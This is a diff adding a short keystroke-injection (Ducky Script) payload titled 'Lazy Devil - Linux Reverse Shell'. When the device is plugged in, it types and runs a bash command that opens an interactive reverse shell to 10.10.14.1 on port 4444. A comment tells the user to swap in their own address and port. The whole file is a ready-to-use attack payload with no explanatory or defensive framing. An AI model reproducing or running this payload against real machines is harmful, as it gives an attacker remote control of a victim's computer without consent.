@@ -1,0 +1,6 @@
+REM Lazy Devil - Linux Reverse Shell
+REM Change 10.10.14.1 and 4444
+REM ===================================
+DELAY 500
+STRING bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' &
+ENTER
